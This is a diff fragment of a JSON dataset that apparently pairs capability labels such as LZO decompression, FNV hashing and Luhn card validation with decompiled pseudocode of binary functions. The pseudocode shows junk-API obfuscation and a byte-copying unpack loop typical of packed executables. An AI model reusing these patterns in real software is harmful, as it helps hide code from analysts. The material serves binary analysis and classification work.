+            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
+            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
+        ],
+        "decompiled_code": "\nuint32_t __cdecl fcn.00402a84(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_28h;\n    uint hdc;\n    uint dwMapFlags;\n    uint var_1ch;\n    uint lpSrcStr;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    uVar5 = arg_8h;\n    uVar2 = arg_8h >> 2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      (uVar2 + uVar5 + -0x123, uVar5 * uVar2 + -0x34ca, (uVar2 - uVar5) + 0xaf, uVar5 + uVar2 + -0x123, \n                       (arg_8h & arg_8h >> 2) - 0x28);\n    uVar2 = uVar2 & 0xffff;\n    if (uVar2 != 0) {\n        (*_sym.imp.MSVCRT.dll__pclose)(uVar2, uVar2, uVar5 * uVar2, uVar5);\n        (*_sym.imp.GDI32.dll_CreatePenIndirect)(uVar5);\n        (*_sym.imp.GDI32.dll_CreateFontIndirectA)((uVar2 ^ 0x39a1) + uVar5);\n    }\n    uVar5 = uVar5 - 1;\n    uVar6 = uVar5 & 0xff;\n    var_4h = uVar2 + uVar6 + 0x213c38bb ^ 0x217d58c7;\n    var_ch = *((uVar5 & 0xff) + 0x13d09db0 ^ 0x13930e88);\n    var_10h = 0xc5c9;\n    uVar2 = uVar6 >> 2;\n    while (var_10h != 0) {\n        uVar1 = arg_ch >> 2;\n        uVar4 = (arg_ch | 0xf1) + arg_8h;\n        *(var_ch + ((uVar4 | uVar1) - 0xda)) = *var_4h;\n        var_ch = var_ch + ((arg_ch & 0xffff ^ uVar4) - 0xd9);\n        var_4h = var_4h + ((arg_ch << 0x18 ^ 0x47) - 0x46);\n        var_10h = var_10h - ((arg_ch & uVar1) + 1);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                          ((arg_ch & 0xffff) - arg_ch, 0, arg_ch & 0xffff & arg_ch, (arg_ch & 0xffff) - arg_ch, \n                           arg_ch - (arg_ch & 0xffff));\n        if (iVar3 != 0) {\n            (*_sym.imp.GDI32.dll_AbortPath)(0);\n            (*_sym.imp.MSVCRT.dll__ismbbprint)(0, 0, 0, iVar3 + (arg_ch & 0xffff));\n        }\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      ((uVar2 - uVar6) + 0xae, uVar6 - 0xe8, (uVar5 & 0xff) - 0xe8, 0, uVar2 * uVar6 + -0x3490);\n    if ((uVar5 & 0xff) != '\\0') {\n        (*_sym.imp.GDI32.dll_GetDCOrgEx)(0, uVar5 & 0xff | uVar2);\n        (*_sym.imp.MSVCRT.dll__wtof)();\n        (*_sym.imp.GDI32.dll_EnableEUDC)(0);\n    }\n    *(0x13d09f80 - uVar6 ^ 0x13930e88) = var_ch;\n    return uVar2;\n}\n",
+        "token_count": 946
+    },
+    "null": {
+        "rules": [
+            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
+            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
+        ],
+        "decompiled_code": "\nuint main(void)\n\n{\n    uint var_4h;\n    \n    fcn.00401000(2);\n    return 0x30c8951a;\n}\n",
+        "token_count": 36
+    },
+    "004019ce": {
+        "rules": [
+            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
+        ],
+        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t fcn.004019ce(void)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint nNumberOfCharsToRead;\n    \n    uVar3 = 0x8d;\n    nNumberOfCharsToRead._0_2_ = (*_sym.imp.KERNEL32.dll_FoldStringW)(0, 0, 0, 0, 0);\n    if (nNumberOfCharsToRead == 0) {\n        nNumberOfCharsToRead._0_2_ = fcn.004018e3();\n    }\n    else {\n        (*_sym.imp.MSVCRT.dll__findclose)();\n        uVar3 = 0xa8;\n        (*_sym.imp.MSVCRT.dll__wtoi)();\n        (*_sym.imp.KERNEL32.dll_ReadConsoleW)(0x2b6b, 0x4a99, (nNumberOfCharsToRead | 0xd5bc) * 0x8d, 0xad, 0xa8);\n        (*_sym.imp.KERNEL32.dll_GetNamedPipeHandleStateA)\n                  (nNumberOfCharsToRead | 0x8d, nNumberOfCharsToRead * 0x11170000 + 0xa8, 0x8d, 0xb5, 0x85, \n                   nNumberOfCharsToRead + 0x934e1dc2, 0xa8);\n    }\n    uVar4 = nNumberOfCharsToRead - 0x11 & 0xff;\n    uVar2 = uVar4 - 0xd00;\n    uVar1 = uVar2 + (uVar3 | 0x8388);\n    uVar3 = (*_sym.imp.KERNEL32.dll_FoldStringW)\n                      (uVar1 * uVar2 + -0x65c940c4, (uVar3 - uVar4) + 0x62, uVar2 + uVar4 + -0xf4de, \n                       (uVar2 & uVar1) - 0x736c, uVar2 * uVar1 + -0x65c940c4);\n    uVar3 = uVar3 & 0xff;\n    if (uVar3 != '\\0') {\n        (*_sym.imp.GDI32.dll_GetLayout)(uVar3 * (uVar1 ^ 0x5a));\n        (*_sym.imp.GDI32.dll_PlayMetaFileRecord)\n                  (uVar2 + uVar2 * -0x50000000, uVar3 - (uVar2 | 0x8c), uVar3 - (uVar1 | 0xac575b61), \n                   (uVar2 ^ 0x80f6) & uVar2);\n    }\n    return uVar2;\n}\n",
+        "token_count": 630
+    },
+    "004018e3": {
+        "rules": [
+            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nint16_t fcn.004018e3(void)\n\n{\n    int16_t iVar1;\n    uint lpBuffer;\n    uint var_8h;\n    uint cchBufferMax;\n    \n    fcn.0040340f();\n    iVar1 = (*_sym.imp.KERNEL32.dll_FoldStringW)(0, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_LoadStringW)(0, 0, iVar1, 0x89);\n    }\n    return iVar1;\n}\n",
+        "token_count": 124
+    },
+    "00403984": {
+        "rules": [
+            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.00403984(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h & 0x913a) == 0x9130) {\n        fcn.00403357(arg_8h - 0xe583, 0x913a);\n    }\n    return 0x913a;\n}\n",
+        "token_count": 99
+    }
+}
